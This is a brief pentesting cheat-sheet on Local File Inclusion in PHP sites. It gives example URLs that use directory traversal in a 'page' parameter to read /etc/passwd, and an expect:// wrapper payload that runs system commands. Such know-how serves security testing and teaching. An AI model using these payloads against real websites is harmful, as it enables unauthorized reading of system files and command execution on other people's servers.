LFI (Local File Inclusion) allows you to read the targets system files from website.

http://website.com/stuff/script.php?page=index.html

Now if its vulnerable you can turn it into this

http://website.com/stuff/script.php?page=../../../../../../../../../etc/passwd

And that will give output of /etc/passwd

## PHP Expect Wrapper
PHP expect:// allows execution of system commands, unfortunately the expect PHP module is not enabled by default.

?page=expect://ls
